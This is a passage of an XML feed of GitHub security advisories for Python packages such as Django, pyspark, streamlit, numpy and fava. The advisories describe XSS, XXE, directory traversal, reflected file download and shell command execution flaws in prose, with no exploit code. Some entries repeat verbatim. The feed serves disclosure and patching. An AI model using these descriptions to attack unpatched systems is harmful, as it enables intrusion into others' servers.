<li><a href="https://github.com/Pycord-Development/pycord/security/advisories/GHSA-qmhj-m29v-gvmr">https://github.com/Pycord-Development/pycord/security/advisories/GHSA-qmhj-m29v-gvmr</a></li>
<li><a href="https://github.com/Pycord-Development/pycord/pull/1568">https://github.com/Pycord-Development/pycord/pull/1568</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-36024">https://nvd.nist.gov/vuln/detail/CVE-2022-36024</a></li>
<li><a href="https://github.com/advisories/GHSA-qmhj-m29v-gvmr">https://github.com/advisories/GHSA-qmhj-m29v-gvmr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qmhj-m29v-gvmr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-08-18T14:18:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[python-docx] Improper Restriction of XML External Entity Reference in python-docx]]></title>
        <id>https://github.com/advisories/GHSA-34wj-p5jm-2p96</id>
        <link href="https://github.com/advisories/GHSA-34wj-p5jm-2p96"/>
        <updated>2022-08-16T03:01:06.000Z</updated>
        <content type="html"><![CDATA[<p>python-docx before 0.8.6 allows context-dependent attackers to conduct XML External Entity (XXE) attacks via a crafted document.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2016-5851">https://nvd.nist.gov/vuln/detail/CVE-2016-5851</a></li>
<li><a href="https://github.com/python-openxml/python-docx/blob/v0.8.6/HISTORY.rst">https://github.com/python-openxml/python-docx/blob/v0.8.6/HISTORY.rst</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6FFMOH7ZPOPQWNJGUZOS5LXX4MGNRXXT/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6FFMOH7ZPOPQWNJGUZOS5LXX4MGNRXXT/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XU2WSYRNB7CLBBFCGSX34XHACTA2SWDZ/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XU2WSYRNB7CLBBFCGSX34XHACTA2SWDZ/</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2016/06/28/7">http://www.openwall.com/lists/oss-security/2016/06/28/7</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2016/06/28/8">http://www.openwall.com/lists/oss-security/2016/06/28/8</a></li>
<li><a href="https://github.com/advisories/GHSA-34wj-p5jm-2p96">https://github.com/advisories/GHSA-34wj-p5jm-2p96</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-34wj-p5jm-2p96</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-13T01:06:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[numpy] Numpy arbitrary file write via symlink attack]]></title>
        <id>https://github.com/advisories/GHSA-2fc2-6r4j-p65h</id>
        <link href="https://github.com/advisories/GHSA-2fc2-6r4j-p65h"/>
        <updated>2022-08-15T03:06:45.000Z</updated>
        <content type="html"><![CDATA[<p>(1) core/tests/test_memmap.py, (2) core/tests/test_multiarray.py, (3) f2py/f2py2e.py, and (4) lib/tests/test_io.py in NumPy before 1.8.1 allow local users to write to arbitrary files via a symlink attack on a temporary file.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2014-1859">https://nvd.nist.gov/vuln/detail/CVE-2014-1859</a></li>
<li><a href="https://github.com/numpy/numpy/pull/4262">https://github.com/numpy/numpy/pull/4262</a></li>
<li><a href="https://github.com/numpy/numpy/commit/0bb46c1448b0d3f5453d5182a17ea7ac5854ee15">https://github.com/numpy/numpy/commit/0bb46c1448b0d3f5453d5182a17ea7ac5854ee15</a></li>
<li><a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=737778">https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=737778</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1062009">https://bugzilla.redhat.com/show_bug.cgi?id=1062009</a></li>
<li><a href="https://exchange.xforce.ibmcloud.com/vulnerabilities/91317">https://exchange.xforce.ibmcloud.com/vulnerabilities/91317</a></li>
<li><a href="https://github.com/numpy/numpy/blob/maintenance/1.8.x/doc/release/1.8.1-notes.rst">https://github.com/numpy/numpy/blob/maintenance/1.8.x/doc/release/1.8.1-notes.rst</a></li>
<li><a href="http://lists.fedoraproject.org/pipermail/package-announce/2014-February/128358.html">http://lists.fedoraproject.org/pipermail/package-announce/2014-February/128358.html</a></li>
<li><a href="http://lists.fedoraproject.org/pipermail/package-announce/2014-February/128781.html">http://lists.fedoraproject.org/pipermail/package-announce/2014-February/128781.html</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2014/02/08/3">http://www.openwall.com/lists/oss-security/2014/02/08/3</a></li>
<li><a href="https://github.com/advisories/GHSA-2fc2-6r4j-p65h">https://github.com/advisories/GHSA-2fc2-6r4j-p65h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2fc2-6r4j-p65h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-14T01:08:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flower] Cross-Site Scripting]]></title>
        <id>https://github.com/advisories/GHSA-94ww-22rx-493x</id>
        <link href="https://github.com/advisories/GHSA-94ww-22rx-493x"/>
        <updated>2022-08-13T03:04:49.000Z</updated>
        <content type="html"><![CDATA[<p>Flower, before 0.9.2, has a XSS on tasks page because data is not properly escaped.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mher/flower/issues/650">https://github.com/mher/flower/issues/650</a></li>
<li><a href="https://github.com/mher/flower/commit/0f2eab324f65823340a0146f7a2b44804e4725ee">https://github.com/mher/flower/commit/0f2eab324f65823340a0146f7a2b44804e4725ee</a></li>
<li><a href="https://github.com/advisories/GHSA-94ww-22rx-493x">https://github.com/advisories/GHSA-94ww-22rx-493x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-94ww-22rx-493x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-02-24T19:46:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[djangorestframework] Cross-Site Scripting]]></title>
        <id>https://github.com/advisories/GHSA-57h7-r3q3-w57j</id>
        <link href="https://github.com/advisories/GHSA-57h7-r3q3-w57j"/>
        <updated>2022-08-13T03:04:48.000Z</updated>
        <content type="html"><![CDATA[<p>Django-Rest-Framework, before 3.9.1, has a XSS vulnerability caused by disabled autoescaping in the default DRF Browsable API view templates.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/encode/django-rest-framework/pull/6330">https://github.com/encode/django-rest-framework/pull/6330</a></li>
<li><a href="https://github.com/encode/django-rest-framework/commit/343ce4a03cad02631752a5e9bde26218fd647c14">https://github.com/encode/django-rest-framework/commit/343ce4a03cad02631752a5e9bde26218fd647c14</a></li>
<li><a href="https://github.com/encode/django-rest-framework/commit/75a489150ae24c2f3c794104a8e98fa43e2c9ce9">https://github.com/encode/django-rest-framework/commit/75a489150ae24c2f3c794104a8e98fa43e2c9ce9</a></li>
<li><a href="https://github.com/advisories/GHSA-57h7-r3q3-w57j">https://github.com/advisories/GHSA-57h7-r3q3-w57j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-57h7-r3q3-w57j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-02-24T19:46:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[autobahn] Timing attack]]></title>
        <id>https://github.com/advisories/GHSA-xm8r-5wh6-f46f</id>
        <link href="https://github.com/advisories/GHSA-xm8r-5wh6-f46f"/>
        <updated>2022-08-13T03:04:44.000Z</updated>
        <content type="html"><![CDATA[<p>While each ID is used for only one authentication attempt, a timing attack is possible to figure out in Autobahn.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/crossbario/autobahn-python/issues/157">https://github.com/crossbario/autobahn-python/issues/157</a></li>
<li><a href="https://www.whitesourcesoftware.com/vulnerability-database/WS-2013-0019">https://www.whitesourcesoftware.com/vulnerability-database/WS-2013-0019</a></li>
<li><a href="https://github.com/advisories/GHSA-xm8r-5wh6-f46f">https://github.com/advisories/GHSA-xm8r-5wh6-f46f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xm8r-5wh6-f46f</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2021-02-24T19:45:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[streamlit] Streamlit directory traversal vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-v4hr-4jpx-56gc</id>
        <link href="https://github.com/advisories/GHSA-v4hr-4jpx-56gc"/>
        <updated>2022-08-11T19:30:31.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Users hosting Streamlit app(s) that use custom components are vulnerable to a directory traversal attack that could leak data from their web server file-system such as: server logs, world readable files, and potentially other sensitive information.</p>
<p>An attacker can craft a malicious URL with file paths and the streamlit server would process that URL and return the contents of that file.</p>
<h3 id="patches">Patches</h3>
<p>On July 27th at 2:20PM PST we rolled out a patch in release 1.11.1. This patch ensures that any file operations are restricted only to the custom component directory and cannot traverse outside of that. We strongly recommend users upgrade to v1.11.1 as soon as possible. We have notified the Streamlit community and popular hosting providers about this issue so they can patch quickly. As a precautionary measure, we are also upgrading all users on Streamlit Cloud wherever possible. We continue to check other occurrences of this vulnerability and monitor potential exploits wherever we can.</p>
<p>Finally, as a general security practice, we recommend users review custom components for any malicious code before using them in their apps. Following security best practices such as running web servers with low privileges, firewalls, etc. for hosting your apps, helps in mitigating the severity of such exploits.</p>
<h3 id="workarounds">Workarounds</h3>
<p>None.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://docs.google.com/document/d/e/2PACX-1vRzF9K6gwv9KnQz---1pt0SdHMVt-CHuKMmdTH1uct7xPcK7vToP4FvYdI84aO6rGfCmrBSaViri0Nd/pub">https://docs.google.com/document/d/e/2PACX-1vRzF9K6gwv9KnQz---1pt0SdHMVt-CHuKMmdTH1uct7xPcK7vToP4FvYdI84aO6rGfCmrBSaViri0Nd/pub</a></li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Email us at <a href="mailto:security@streamlit.io">security@streamlit.io</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/streamlit/streamlit/security/advisories/GHSA-v4hr-4jpx-56gc">https://github.com/streamlit/streamlit/security/advisories/GHSA-v4hr-4jpx-56gc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-35918">https://nvd.nist.gov/vuln/detail/CVE-2022-35918</a></li>
<li><a href="https://github.com/streamlit/streamlit/commit/80d9979d5f4a00217743d607078a1d867fad8acf">https://github.com/streamlit/streamlit/commit/80d9979d5f4a00217743d607078a1d867fad8acf</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/streamlit/PYSEC-2022-248.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/streamlit/PYSEC-2022-248.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-v4hr-4jpx-56gc">https://github.com/advisories/GHSA-v4hr-4jpx-56gc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v4hr-4jpx-56gc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-08-06T05:51:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[django-sendfile2] django-sendfile2 before 0.7.0 contains reflected file download vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-pcjh-6r5h-r92r</id>
        <link href="https://github.com/advisories/GHSA-pcjh-6r5h-r92r"/>
        <updated>2022-08-11T18:12:37.000Z</updated>
        <content type="html"><![CDATA[<p>Similar to CVE-2022-36359 for Django, django-sendfile2 did not protect against a reflected file download attack in version 0.6.1 and earlier. If the file name used by django-sendfile2 was derived from user input, then it would be possible to perform a such an attack. A new version of django-sendfile2 will be released. Either download django-sendfile2 0.7.0 as a workaround or sanitize user input yourself, using Django's patch as a template: <a href="https://github.com/django/django/commit/bd062445cffd3f6cc6dcd20d13e2abed818fa173">https://github.com/django/django/commit/bd062445cffd3f6cc6dcd20d13e2abed818fa173</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/moggers87/django-sendfile2/security/advisories/GHSA-pcjh-6r5h-r92r">https://github.com/moggers87/django-sendfile2/security/advisories/GHSA-pcjh-6r5h-r92r</a></li>
<li><a href="https://github.com/moggers87/django-sendfile2/commit/4c370859023292e3715200a57843f86c5ef3cd77">https://github.com/moggers87/django-sendfile2/commit/4c370859023292e3715200a57843f86c5ef3cd77</a></li>
<li><a href="https://github.com/moggers87/django-sendfile2/releases/tag/v0.7.0">https://github.com/moggers87/django-sendfile2/releases/tag/v0.7.0</a></li>
<li><a href="https://github.com/advisories/GHSA-pcjh-6r5h-r92r">https://github.com/advisories/GHSA-pcjh-6r5h-r92r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pcjh-6r5h-r92r</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-08-11T18:12:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mofh] mofh Vulnerable to Improper Restriction of XML External Entity Reference]]></title>
        <id>https://github.com/advisories/GHSA-7r9x-qrpr-3cxw</id>
        <link href="https://github.com/advisories/GHSA-7r9x-qrpr-3cxw"/>
        <updated>2022-08-11T18:06:05.000Z</updated>
        <content type="html"><![CDATA[<p>The <code>xml.etree.ElementTree</code> module that mofh used up until version <code>1.0.1</code> implements a simple and efficient API for parsing and creating XML data. But it makes the application vulnerable to:</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Billion_laughs_attack">Billion Laughs attack</a>: It is a type of denial-of-service attack aimed at XML parsers. It uses multiple levels of nested entities. If one large entity is repeated with a couple of thousand chars repeatedly, the parser gets overwhelmed.  </li>
<li><a href="https://www.acunetix.com/vulnerabilities/web/xml-quadratic-blowup-denial-of-service-attack/">Quadratic blowup attack</a>: It is similar to a Billion Laughs attack. It abuses entity expansion, too. Instead of nested entities, it repeats one large entity with a couple of thousand chars repeatedly.</li>
</ul>
<p>The Problem has been patched starting from version <code>1.0.1</code> by utilising the <code>defusedxml</code> package instead of <code>xml.etree.ElementTree</code>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>For this vulnerability to be exploited the user must be using a custom API URL, which has to be manually given using the <code>api_url</code> argument, or MyOwnFreeHost's API must be hacked. So, if the user did not use a custom API URL they <em>should</em> be fine, however, upgrading is still advised.</p>
<p>Another workaround could be to call <code>defusedxml.defuse_stdlib()</code> before making any requests using the client.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Wallvon/mofh/security/advisories/GHSA-7r9x-qrpr-3cxw">https://github.com/Wallvon/mofh/security/advisories/GHSA-7r9x-qrpr-3cxw</a></li>
<li><a href="https://github.com/Wallvon/mofh/commit/da0d33cfd368e2f237ab28bf7a7f00e3d281005a">https://github.com/Wallvon/mofh/commit/da0d33cfd368e2f237ab28bf7a7f00e3d281005a</a></li>
<li><a href="https://www.acunetix.com/vulnerabilities/web/xml-quadratic-blowup-denial-of-service-attack/">https://www.acunetix.com/vulnerabilities/web/xml-quadratic-blowup-denial-of-service-attack/</a></li>
<li><a href="https://github.com/advisories/GHSA-7r9x-qrpr-3cxw">https://github.com/advisories/GHSA-7r9x-qrpr-3cxw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7r9x-qrpr-3cxw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-08-11T18:06:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Django] Django 3.2 before 3.2.15 and 4.0 before 4.0.7 vulnerable to Reflected File Download attack ]]></title>
        <id>https://github.com/advisories/GHSA-8x94-hmjh-97hq</id>
        <link href="https://github.com/advisories/GHSA-8x94-hmjh-97hq"/>
        <updated>2022-08-11T14:49:13.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in the HTTP FileResponse class in Django 3.2 before 3.2.15 and 4.0 before 4.0.7. An application is vulnerable to a reflected file download (RFD) attack that sets the Content-Disposition header of a FileResponse when the filename is derived from user-supplied input.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-36359">https://nvd.nist.gov/vuln/detail/CVE-2022-36359</a></li>
<li><a href="https://docs.djangoproject.com/en/4.0/releases/security/">https://docs.djangoproject.com/en/4.0/releases/security/</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2022-245.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2022-245.yaml</a></li>
<li><a href="https://groups.google.com/g/django-announce/c/8cz--gvaJr4">https://groups.google.com/g/django-announce/c/8cz--gvaJr4</a></li>
<li><a href="https://www.djangoproject.com/weblog/2022/aug/03/security-releases/">https://www.djangoproject.com/weblog/2022/aug/03/security-releases/</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2022/08/03/1">http://www.openwall.com/lists/oss-security/2022/08/03/1</a></li>
<li><a href="https://github.com/advisories/GHSA-8x94-hmjh-97hq">https://github.com/advisories/GHSA-8x94-hmjh-97hq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8x94-hmjh-97hq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-08-11T14:49:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Django] Django 3.2 before 3.2.15 and 4.0 before 4.0.7 vulnerable to Reflected File Download attack ]]></title>
        <id>https://github.com/advisories/GHSA-8x94-hmjh-97hq</id>
        <link href="https://github.com/advisories/GHSA-8x94-hmjh-97hq"/>
        <updated>2022-08-11T14:49:13.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in the HTTP FileResponse class in Django 3.2 before 3.2.15 and 4.0 before 4.0.7. An application is vulnerable to a reflected file download (RFD) attack that sets the Content-Disposition header of a FileResponse when the filename is derived from user-supplied input.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-36359">https://nvd.nist.gov/vuln/detail/CVE-2022-36359</a></li>
<li><a href="https://docs.djangoproject.com/en/4.0/releases/security/">https://docs.djangoproject.com/en/4.0/releases/security/</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2022-245.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2022-245.yaml</a></li>
<li><a href="https://groups.google.com/g/django-announce/c/8cz--gvaJr4">https://groups.google.com/g/django-announce/c/8cz--gvaJr4</a></li>
<li><a href="https://www.djangoproject.com/weblog/2022/aug/03/security-releases/">https://www.djangoproject.com/weblog/2022/aug/03/security-releases/</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2022/08/03/1">http://www.openwall.com/lists/oss-security/2022/08/03/1</a></li>
<li><a href="https://github.com/advisories/GHSA-8x94-hmjh-97hq">https://github.com/advisories/GHSA-8x94-hmjh-97hq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8x94-hmjh-97hq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-08-11T14:49:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyspark] Apache Spark UI code path in HttpSecurityFilter can allow impersonation if ACLs enabled]]></title>
        <id>https://github.com/advisories/GHSA-4x9r-j582-cgr8</id>
        <link href="https://github.com/advisories/GHSA-4x9r-j582-cgr8"/>
        <updated>2022-08-10T22:17:17.000Z</updated>
        <content type="html"><![CDATA[<p>The Apache Spark UI offers the possibility to enable ACLs via the configuration option spark.acls.enable. With an authentication filter, this checks whether a user has access permissions to view or modify the application. If ACLs are enabled, a code path in HttpSecurityFilter can allow someone to perform impersonation by providing an arbitrary user name. A malicious user might then be able to reach a permission check function that will ultimately build a Unix shell command based on their input, and execute it. This will result in arbitrary shell command execution as the user Spark is currently running as. This affects Apache Spark versions 3.0.3 and earlier, versions 3.1.1 to 3.1.2, and versions 3.2.0 to 3.2.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-33891">https://nvd.nist.gov/vuln/detail/CVE-2022-33891</a></li>
<li><a href="https://lists.apache.org/thread/p847l3kopoo5bjtmxrcwk21xp6tjxqlc">https://lists.apache.org/thread/p847l3kopoo5bjtmxrcwk21xp6tjxqlc</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pyspark/PYSEC-2022-236.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pyspark/PYSEC-2022-236.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-4x9r-j582-cgr8">https://github.com/advisories/GHSA-4x9r-j582-cgr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4x9r-j582-cgr8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-07-19T00:00:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyspark] Apache Spark UI code path in HttpSecurityFilter can allow impersonation if ACLs enabled]]></title>
        <id>https://github.com/advisories/GHSA-4x9r-j582-cgr8</id>
        <link href="https://github.com/advisories/GHSA-4x9r-j582-cgr8"/>
        <updated>2022-08-10T22:17:17.000Z</updated>
        <content type="html"><![CDATA[<p>The Apache Spark UI offers the possibility to enable ACLs via the configuration option spark.acls.enable. With an authentication filter, this checks whether a user has access permissions to view or modify the application. If ACLs are enabled, a code path in HttpSecurityFilter can allow someone to perform impersonation by providing an arbitrary user name. A malicious user might then be able to reach a permission check function that will ultimately build a Unix shell command based on their input, and execute it. This will result in arbitrary shell command execution as the user Spark is currently running as. This affects Apache Spark versions 3.0.3 and earlier, versions 3.1.1 to 3.1.2, and versions 3.2.0 to 3.2.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-33891">https://nvd.nist.gov/vuln/detail/CVE-2022-33891</a></li>
<li><a href="https://lists.apache.org/thread/p847l3kopoo5bjtmxrcwk21xp6tjxqlc">https://lists.apache.org/thread/p847l3kopoo5bjtmxrcwk21xp6tjxqlc</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pyspark/PYSEC-2022-236.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pyspark/PYSEC-2022-236.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-4x9r-j582-cgr8">https://github.com/advisories/GHSA-4x9r-j582-cgr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4x9r-j582-cgr8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-07-19T00:00:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyspark] Apache Spark UI code path in HttpSecurityFilter can allow impersonation if ACLs enabled]]></title>
        <id>https://github.com/advisories/GHSA-4x9r-j582-cgr8</id>
        <link href="https://github.com/advisories/GHSA-4x9r-j582-cgr8"/>
        <updated>2022-08-10T22:17:17.000Z</updated>
        <content type="html"><![CDATA[<p>The Apache Spark UI offers the possibility to enable ACLs via the configuration option spark.acls.enable. With an authentication filter, this checks whether a user has access permissions to view or modify the application. If ACLs are enabled, a code path in HttpSecurityFilter can allow someone to perform impersonation by providing an arbitrary user name. A malicious user might then be able to reach a permission check function that will ultimately build a Unix shell command based on their input, and execute it. This will result in arbitrary shell command execution as the user Spark is currently running as. This affects Apache Spark versions 3.0.3 and earlier, versions 3.1.1 to 3.1.2, and versions 3.2.0 to 3.2.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-33891">https://nvd.nist.gov/vuln/detail/CVE-2022-33891</a></li>
<li><a href="https://lists.apache.org/thread/p847l3kopoo5bjtmxrcwk21xp6tjxqlc">https://lists.apache.org/thread/p847l3kopoo5bjtmxrcwk21xp6tjxqlc</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pyspark/PYSEC-2022-236.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pyspark/PYSEC-2022-236.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-4x9r-j582-cgr8">https://github.com/advisories/GHSA-4x9r-j582-cgr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4x9r-j582-cgr8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-07-19T00:00:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fava] Fava before 1.22.3 vulnerable to reflected cross-site scripting]]></title>
        <id>https://github.com/advisories/GHSA-6hcj-qrw3-m66q</id>
        <link href="https://github.com/advisories/GHSA-6hcj-qrw3-m66q"/>
        <updated>2022-08-10T15:57:46.000Z</updated>
        <content type="html"><![CDATA[<p>Fava before 1.22.3 is vulnerable to reflected cross-site scripting due to improper validation on filter conversion.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-2589">https://nvd.nist.gov/vuln/detail/CVE-2022-2589</a></li>
<li><a href="https://github.com/beancount/fava/commit/68bbb6e39319deb35ab9f18d0b6aa9fa70472539">https://github.com/beancount/fava/commit/68bbb6e39319deb35ab9f18d0b6aa9fa70472539</a></li>
<li><a href="https://huntr.dev/bounties/8705800d-cf2f-433d-9c3e-dbef6a3f7e08">https://huntr.dev/bounties/8705800d-cf2f-433d-9c3e-dbef6a3f7e08</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/fava/PYSEC-2022-246.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/fava/PYSEC-2022-246.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-6hcj-qrw3-m66q">https://github.com/advisories/GHSA-6hcj-qrw3-m66q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6hcj-qrw3-m66q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-08-02T00:00:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fava] Fava vulnerable to Reflected Cross-site Scripting before v1.22.2]]></title>
        <id>https://github.com/advisories/GHSA-q8hg-3vqv-f8v3</id>
        <link href="https://github.com/advisories/GHSA-q8hg-3vqv-f8v3"/>
        <updated>2022-08-06T09:34:39.000Z</updated>
        <content type="html"><![CDATA[<p>Cross-site Scripting (XSS) - Reflected in GitHub repository beancount/fava prior to 1.22.2.
The <code>query_string</code> parameter of Fava is vulnerable to reflected cross-site scripting, for which a attacker can modify any information that the user is able to modify. This issue is fixed in version 1.22.2.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-2523">https://nvd.nist.gov/vuln/detail/CVE-2022-2523</a></li>
<li><a href="https://github.com/beancount/fava/commit/dccfb6a2f4567f35ce2e9a78e24f92ebf946bc9b">https://github.com/beancount/fava/commit/dccfb6a2f4567f35ce2e9a78e24f92ebf946bc9b</a></li>
<li><a href="https://huntr.dev/bounties/2a1802d8-1c2e-4919-96a7-d4dcf7ffcf8f">https://huntr.dev/bounties/2a1802d8-1c2e-4919-96a7-d4dcf7ffcf8f</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/fava/PYSEC-2022-240.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/fava/PYSEC-2022-240.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-q8hg-3vqv-f8v3">https://github.com/advisories/GHSA-q8hg-3vqv-f8v3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q8hg-3vqv-f8v3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-07-26T00:01:08.000Z</published>
    </entry>
</feed>